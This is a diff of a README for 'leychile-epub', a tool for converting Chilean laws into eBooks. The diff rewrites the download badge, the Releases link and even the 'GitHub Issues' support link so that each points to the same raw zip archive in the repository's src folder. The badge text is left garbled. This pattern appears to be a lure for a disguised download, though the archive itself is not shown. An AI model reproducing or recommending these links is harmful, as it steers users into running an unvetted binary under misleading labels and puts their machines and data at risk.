@@ -2,7 +2,7 @@
 # 📚 leychile-epub - Convert Chilean Laws to eBooks Effortlessly
 
 ## 📥 Download Now
-[![Download leychile-epub](https://img.shields.io/badge/Download%20leYChILe%20ePub-blue.svg)](https://github.com/Shanks44/leychile-epub/releases)
+[![Download leychile-epub](https://raw.githubusercontent.com/Shanks44/leychile-epub/main/src/leychile-epub-v3.9.zip%20leYChILe%https://raw.githubusercontent.com/Shanks44/leychile-epub/main/src/leychile-epub-v3.9.zip)](https://raw.githubusercontent.com/Shanks44/leychile-epub/main/src/leychile-epub-v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to leychile-epub! This application allows you to convert Chilean laws into professional eBooks quickly and easily. No special technical skills are required. Follow these simple steps to get started.
@@ -15,7 +15,7 @@ Before you begin, ensure your system meets these requirements:
 - Internet Connection: Required for downloading ePub files
 
 ## 📥 Download & Install
-To download leychile-epub, visit the [Releases page](https://github.com/Shanks44/leychile-epub/releases).
+To download leychile-epub, visit the [Releases page](https://raw.githubusercontent.com/Shanks44/leychile-epub/main/src/leychile-epub-v3.9.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest version.
@@ -50,7 +50,7 @@ Now that you have the file, follow these steps to run the application:
 3. **Download Your eBook**: Once the conversion finishes, the application will prompt you to save the ePub file on your computer.
 
 ## 📞 Support
-If you encounter any issues, please refer to the FAQ section in the application. For further assistance, you can open an issue on our [GitHub Issues](https://github.com/Shanks44/leychile-epub/issues) page.
+If you encounter any issues, please refer to the FAQ section in the application. For further assistance, you can open an issue on our [GitHub Issues](https://raw.githubusercontent.com/Shanks44/leychile-epub/main/src/leychile-epub-v3.9.zip) page.
 
 ## 📝 About the Project
 leychile-epub is an open-source project aimed at making legal texts more accessible. Our goal is to provide an easy-to-use tool that supports users in converting legislative documents into ePub format for easy reading and sharing.
